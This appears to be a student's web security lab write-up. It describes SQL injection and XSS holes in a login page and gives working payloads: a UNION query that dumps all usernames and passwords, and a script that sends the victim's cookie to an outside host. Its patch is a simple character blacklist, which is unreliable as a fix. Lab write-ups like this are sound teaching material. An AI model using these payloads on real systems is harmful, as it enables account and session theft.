#### Web Security ####

Vulnerabilities:
	1. There is SQL Injection vulnerability in the web application which allows users to insert malicious 
		scripts and get unauthorized information from the database
	2. There is another vulnerability which is Cross Site Scripting XSS one. With this vulnerability the attacker
		can insert the malicious javascripts and get the important information like the cookie. With cookie the
		the attacker login as a valid user and perform malicious activity

Exploit:
	1. To perform the exploit with SQL Injection I entered queries like 
		"' union select 1,2,group_concat(username, passwd),4,5 from users --"
		The query outputs all combinations of the usernames and passwords as output to the status message 
		on the login page
	2. To perform the exploit with XSS I entered the following javascript to redirect the user to 
		another fake webpage and send out the cookie value as parameter to fake webpage
		"<script>window.location.href="http://amplifier.ccs.neu.edu:29406/xss?userCookie="+document.cookie</script>"

Patch for the vulnerabilities:
	The patch for both the vulnerabilities is almost same. I performed the user input validation and removed 
		possibility of the bad input by checking the user entered data. I converted the user input to string and
		then checked for characters like ['], ["], [,], [<], [>]. If such characters are present in the user input
		I simply discarded the input
